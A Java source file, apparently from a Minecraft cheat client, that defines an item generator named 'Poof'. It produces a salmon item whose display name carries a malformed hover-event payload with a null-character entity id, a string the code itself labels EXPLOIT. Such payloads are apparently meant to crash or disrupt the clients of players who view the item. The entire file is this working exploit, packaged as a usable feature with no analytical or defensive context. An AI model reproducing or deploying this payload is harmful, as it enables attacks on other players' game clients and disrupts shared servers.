/*
 * Copyright (c) 2022 Coffee Client, 0x150 and contributors. All rights reserved.
 */

package vertex.client.feature.items.impl;

import vertex.client.feature.items.Item;
import vertex.client.feature.items.Option;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;

public class Poof extends Item {
    final Option<String> name = new Option<>("itemName", "Sam the Salmon", String.class);

    public Poof() {
        super("Poof", "the");
    }

    @Override
    public ItemStack generate() {
        String EXPLOIT = "{\"hoverEvent\":{\"action\":\"show_entity\",\"contents\":{\"type\":\"minecraft:bat\",\"id\":\"\0\"}},\"text\":\"" + name.getValue() + "\"}";
        ItemStack stack = new ItemStack(Items.SALMON);
        NbtCompound display = stack.getOrCreateSubNbt("display");
        display.putString("Name", EXPLOIT);
        return stack;
    }
}
